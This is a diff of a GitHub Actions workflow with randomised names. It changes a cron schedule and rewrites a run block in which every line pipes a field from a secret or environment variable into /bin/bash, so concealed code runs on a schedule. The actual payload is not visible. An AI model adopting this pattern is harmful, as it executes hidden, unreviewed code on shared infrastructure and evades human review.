@@ -1,22 +1,23 @@
 name: chenseqing6751
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 4/6 * * *'
+    - cron: '5 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chenseqing6751
         env:
-          dmkik1031: ${{ secrets.dmkik1031 }}
+          mh83: ${{ secrets.mh83 }}
         run: |
-          echo $dmkik1031 | jq -r .z0194 | /bin/bash
-          echo $oq0 | jq -r .ewtuc5309 | /bin/bash
-          echo $f96793 | jq -r .ua6 | /bin/bash
-          echo $ndqev86 | jq -r .i1969 | /bin/bash
-          echo $rek627 | jq -r .rrwa4 | /bin/bash
+          echo $mh83 | jq -r .ehgdu09685 | /bin/bash
+          echo $zx3443 | jq -r .awq6157 | /bin/bash
+          echo $q7750 | jq -r .jl9 | /bin/bash
+          echo $vahls3447 | jq -r .yjrq2 | /bin/bash
+          echo $xeg06 | jq -r .w10275 | /bin/bash
+          echo $qti62 | jq -r .ui605 | /bin/bash
 
